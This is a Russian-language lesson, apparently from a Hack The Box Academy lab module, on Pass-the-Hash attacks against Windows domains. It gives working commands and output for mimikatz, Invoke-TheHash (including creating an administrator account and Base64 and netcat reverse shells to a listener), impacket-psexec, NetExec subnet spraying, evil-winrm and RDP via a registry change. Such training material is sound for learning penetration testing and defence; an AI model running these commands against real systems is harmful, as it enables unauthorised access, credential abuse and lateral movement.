```
Invoke-SMBExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "C:\tools\nc.exe 172.16.1.5 8001 -e cmd.exe"
```

ЕСЛИ У ПОЛЬЗОВАТЕЛЯ НЕТУ ПРАВ АДМИНИСТРАТОРА НАДО ИСПОЛЬЗОВАТЬ evil-winrm а не impacket

Атака Pass [the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) — это метод, при котором злоумышленник использует хеш пароля вместо открытого текста пароля для аутентификации. Злоумышленнику не нужно расшифровывать хеш, чтобы получить пароль в открытом виде. Атаки PtH используют уязвимость протокола аутентификации, поскольку хеш пароля остается неизменным для каждой сессии до тех пор, пока пароль не будет изменен.

Как обсуждалось в предыдущих разделах, для получения хеша пароля злоумышленник должен обладать административными привилегиями или определенными привилегиями на целевом компьютере. Хэши можно получить несколькими способами, в том числе:

- Выгрузка локальной базы данных SAM с скомпрометированного хоста.
- Извлечение хешей из базы данных NTDS (ntds.dit) на контроллере домена.
- Извлечение хешей из памяти (lsass.exe).

Предположим, мы получили хеш пароля ( `64F12CDDAA88057E06A81B54E73B949B`) для учетной записи `julio`из домена `inlanefreight.htb`. Давайте посмотрим, как можно выполнить атаку Pass the Hash с машин под управлением Windows и Linux.

**Примечание:** Инструменты, которые мы будем использовать, находятся в `C:\tools`каталоге на целевом хосте. После запуска машины и выполнения упражнений вы сможете использовать инструменты из этого каталога. В этой лабораторной работе используются две машины: к одной (MS01) у вас будет доступ, и оттуда вы подключитесь ко второй машине (DC01).

## Введение в Windows NTLM

Microsoft [Windows New Technology LAN Manager (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) — это набор протоколов безопасности, которые аутентифицируют пользователей, одновременно защищая целостность и конфиденциальность их данных. NTLM — это решение для единого входа (SSO), использующее протокол «запрос-ответ» для проверки личности пользователя без необходимости ввода пароля.

Несмотря на известные недостатки, NTLM по-прежнему широко используется для обеспечения совместимости с устаревшими клиентами и серверами, даже в современных системах. Хотя Microsoft продолжает поддерживать NTLM, Kerberos стал механизмом аутентификации по умолчанию в Windows 2000 и последующих доменах Active Directory (AD).

В протоколе NTLM пароли, хранящиеся на сервере и контроллере домена, не «солятся», что означает, что злоумышленник, имеющий хэш пароля, может аутентифицировать сессию, не зная исходного пароля. Мы называем это `Pass the Hash (PtH) Attack`.

## Передайте хэш с помощью Mimikatz (Windows)

Первым инструментом, который мы будем использовать для проведения атаки Pass the Hash, является [Mimikatz](https://github.com/gentilkiwi) . В Mimikatz есть модуль `sekurlsa::pth`, который позволяет нам выполнить атаку Pass the Hash, запустив процесс, использующий хеш пароля пользователя. Для использования этого модуля нам потребуется следующее:

- `/user`- Имя пользователя, которого мы хотим выдать за себя.
- `/rc4`или `/NTLM`- NTLM-хеш пароля пользователя.
- `/domain`- Домен, к которому принадлежит пользователь, от имени которого он хочет отдать себя. В случае локальной учетной записи пользователя можно использовать имя компьютера, localhost или точку (.).
- `/run`- Программа, которую мы хотим запустить в контексте пользователя (если не указано, будет запущена cmd.exe).

#### Передача хеша из Windows с помощью Mimikatz.

  Pass the Hash (PtH)

```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

Теперь мы можем использовать cmd.exe для выполнения команд в контексте пользователя. В этом примере `julio`можно подключиться к общей папке с именем `julio`на контроллере домена.

![В командной строке отображается выполнение команды mimikatz с повышением привилегий и просмотром содержимого каталога.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/pth_julio.jpg)

## Передайте хэш с помощью PowerShell Invoke-TheHash (Windows)

Еще один инструмент, который можно использовать для проведения атак Pass the Hash в Windows, — это [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) . Этот инструмент представляет собой набор функций PowerShell для проведения атак Pass the Hash с использованием WMI и SMB. Доступ к соединениям WMI и SMB осуществляется через .NET TCPClient. Аутентификация выполняется путем передачи хеша NTLM в протокол аутентификации NTLMv2. Локальные права администратора на стороне клиента не требуются, но пользователь и хеш, используемые для аутентификации, должны иметь права администратора на целевом компьютере. В этом примере мы будем использовать пользователя `julio`и хеш `64F12CDDAA88057E06A81B54E73B949B`.

При использовании `Invoke-TheHash`этого инструмента у нас есть два варианта: выполнение команд по протоколам SMB или WMI. Для использования этого инструмента необходимо указать следующие параметры для выполнения команд на целевом компьютере:

- `Target`- Имя хоста или IP-адрес целевого объекта.
- `Username`- Имя пользователя для аутентификации.
- `Domain`- Домен, используемый для аутентификации. Этот параметр не требуется для локальных учетных записей или при использовании @домена после имени пользователя.
- `Hash`- Хэш пароля NTLM для аутентификации. Эта функция принимает форматы LM:NTLM или NTLM.
- `Command`- Команда для выполнения на целевом устройстве. Если команда не указана, функция проверит, имеют ли имя пользователя и хеш доступ к WMI на целевом устройстве.

Следующая команда использует метод SMB для выполнения команд, чтобы создать нового пользователя с именем mark и добавить его в группу администраторов.

#### Invoke-TheHash с использованием SMB

  Pass the Hash (PtH)

```powershell-session
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

Мы также можем получить обратное соединение через командную оболочку на целевой машине. Если вы не знакомы с обратными оболочками, ознакомьтесь с модулем [«Оболочки и полезные нагрузки»](https://academy.hackthebox.com/module/details/115) на HTB Academy.

Для получения обратной оболочки нам необходимо запустить наш слушатель с помощью Netcat на нашей машине под управлением Windows, имеющей IP-адрес `172.16.1.5`. Мы будем использовать порт `8001`для ожидания подключения.

#### Слушатель Netcat

  Pass the Hash (PtH)

```powershell-session
PS C:\tools> .\nc.exe -lvnp 8001

listening on [any] 8001 ...
```

Чтобы создать простую обратную оболочку с помощью PowerShell, мы можем перейти на сайт [revshells.com](https://www.revshells.com/) , указать свой IP-адрес `172.16.1.5`и порт `8001`, а также выбрать соответствующую опцию `PowerShell #3 (Base64)`, как показано на следующем изображении.

![Интерфейс генератора обратной оболочки с IP-адресом 172.16.1.5, портом 8001 и полезной нагрузкой PowerShell Base64.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rshellonline.jpg)

Теперь мы можем выполнить команду `Invoke-TheHash`для запуска нашего скрипта обратной оболочки PowerShell на целевом компьютере. Обратите внимание, что вместо IP-адреса, который равен `172.16.1.10`, мы будем использовать имя машины `DC01`(подойдет любой из вариантов).

#### Invoke-TheHash с помощью WMI

  Pass the Hash (PtH)

```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01
```

В результате устанавливается обратное соединение через оболочку с хоста DC01 (172.16.1.10).

![В PowerShell и командной строке показано выполнение команды Invoke-TheHash с указанием параметров сетевого подключения и выводом команды whoami.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/pth_invoke_the_hash.jpg)

## Передача хеша с помощью Impacket (Linux)

[Impacket](https://github.com/SecureAuthCorp/impacket) предоставляет несколько инструментов, которые можно использовать для различных операций, таких как `Command Execution`и `Credential Dumping`, `Enumeration`, и т. д. В этом примере мы выполним команду на целевой машине с помощью `PsExec`.

#### Передайте хэш с помощью Impacket PsExec

  Pass the Hash (PtH)

```shell-session
MuraMitchi@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

В наборе инструментов Impacket есть несколько других инструментов, которые мы можем использовать для выполнения команд с помощью атак Pass the Hash, например:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-ateexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

## Передача хеша с помощью NetExec (Linux)

[NetExec](https://github.com/Pennyw0rth/NetExec) — это инструмент для постэксплуатации, помогающий автоматизировать оценку безопасности больших сетей Active Directory. Мы можем использовать NetExec для попытки аутентификации на некоторых или всех хостах в сети, ища один хост, на котором мы сможем успешно пройти аутентификацию в качестве локального администратора. Этот метод также называется «перебор паролей» и подробно рассматривается в `Active Directory Enumeration & Attacks`модуле. Обратите внимание, что этот метод может блокировать учетные записи домена, поэтому учитывайте политику блокировки учетных записей целевого домена и обязательно используйте метод локальной учетной записи, который предпримет только одну попытку входа на хост в заданном диапазоне, используя предоставленные учетные данные, если это ваша цель.

#### Передайте хэш с помощью NetExec

  Pass the Hash (PtH)

```shell-session
MuraMitchi@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

Если мы хотим выполнить те же действия, но попытаться аутентифицироваться на каждом хосте в подсети, используя хэш пароля локального администратора, мы можем добавить `--local-auth`к нашей команде. Этот метод полезен, если мы получаем хэш пароля локального администратора, выгрузив локальную базу данных SAM на одном хосте, и хотим проверить, к скольким (если таковые имеются) другим хостам мы можем получить доступ благодаря повторному использованию пароля локального администратора. Если мы видим `Pwn3d!`, это означает, что пользователь является локальным администратором на целевом компьютере. Мы можем использовать опцию `-x`для выполнения команд. Повторное использование паролей на многих хостах в одной подсети — распространенная практика. Организации часто используют эталонные образы с одним и тем же паролем локального администратора или устанавливают этот пароль одинаковым для нескольких хостов для упрощения администрирования. Если мы столкнемся с этой проблемой в реальной работе, отличной рекомендацией для клиента будет внедрение [решения для генерации паролей локального администратора (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) , которое рандомизирует пароль локального администратора и может быть настроено на его смену через фиксированный интервал.

#### NetExec - Выполнение команд

  Pass the Hash (PtH)

```shell-session
MuraMitchi@htb[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
```

Чтобы узнать больше о многочисленных возможностях этого инструмента, ознакомьтесь с [документацией NetExec в Вики .](https://www.netexec.wiki/)

## Передайте хэш с помощью evil-winrm (Linux)

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) — ещё один инструмент, который можно использовать для аутентификации с помощью атаки Pass the Hash при удалённом подключении через PowerShell. Если протокол SMB заблокирован или у нас нет прав администратора, мы можем использовать этот альтернативный протокол для подключения к целевой машине.

#### Pass the Hash with evil-winrm

  Pass the Hash (PtH)

```shell-session
MuraMitchi@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Примечание:** При использовании доменной учетной записи необходимо указать доменное имя, например: administrator@inlanefreight.htb

## Передача хеша с помощью RDP (Linux)

Мы можем выполнить атаку RDP PtH, чтобы получить доступ к графическому интерфейсу целевой системы, используя такие инструменты, как `xfreerdp`.

У этой атаки есть несколько особенностей:

- `Restricted Admin Mode`Параметр, который по умолчанию отключен, следует включить на целевом хосте; в противном случае вы получите следующую ошибку:

![Сообщение об ошибке: Ограничения учетной записи препятствуют входу в систему из-за пустых паролей, ограниченного времени входа или ограничений политики.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rdp_session-4.png)

Это можно включить, добавив новый ключ реестра `DisableRestrictedAdmin`(REG_DWORD) `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`со значением 0. Для этого используется следующая команда:

#### Включите режим ограниченного администрирования, чтобы разрешить доступ к PtH.

  Pass the Hash (PtH)

```cmd-session
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![Редактор реестра показывает путь к Lsa с параметром DisableRestrictedAdmin, равным 0.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rdp_session-5.png)

После добавления ключа реестра мы можем использовать его `xfreerdp`с опцией `/pth`получения доступа по протоколу RDP:

#### Передайте хэш с помощью RDP.

  Pass the Hash (PtH)

```shell-session
MuraMitchi@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
...snip...
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
...SNIP...
```

![Доступ к рабочему столу Windows осуществляется через FreeRDP с помощью Parrot Terminal, отображающего выполнение команд и значки корзины, Invoke-TheHash и mimikatz на рабочем столе.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/rdp_session_new.jpg)

## UAC ограничивает передачу хеша для локальных учетных записей.

UAC (контроль учетных записей пользователей) ограничивает возможности локальных пользователей по выполнению операций удаленного администрирования. Если значение параметра реестра `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`равно 0, это означает, что встроенная локальная учетная запись администратора (RID-500, "Администратор") является единственной локальной учетной записью, которой разрешено выполнять задачи удаленного администрирования. Установка значения 1 позволяет другим локальным администраторам также выполнять эти задачи.

**Примечание:** существует одно исключение: если ключ реестра `FilterAdministratorToken`(по умолчанию отключен) включен (значение 1), учетная запись RID 500 (даже если она переименована) регистрируется в системе защиты UAC. Это означает, что удаленная проверка подлинности (PTH) на этом компьютере не удастся при использовании этой учетной записи.

Эти настройки предназначены только для локальных административных учетных записей. Если мы получим доступ к учетной записи домена с правами администратора на компьютере, мы все равно сможем использовать Pass the Hash на этом компьютере. Если вы хотите узнать больше о LocalAccountTokenFilterPolicy, вы можете прочитать статью в блоге Уилла Шредера « [Pass-the-Hash мертв: да здравствует LocalAccountTokenFilterPolicy»](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167) .

## Следующие шаги

В этом разделе мы узнали, как использовать хеш NTLM (RC4-HMAC) пароля пользователя для выполнения атаки Pass the Hash (PtH) и перемещения по целевой сети, но это не единственный способ перемещения. В следующем разделе мы узнаем, как использовать протокол Kerberos для перемещения по сети и аутентификации под разными пользователями.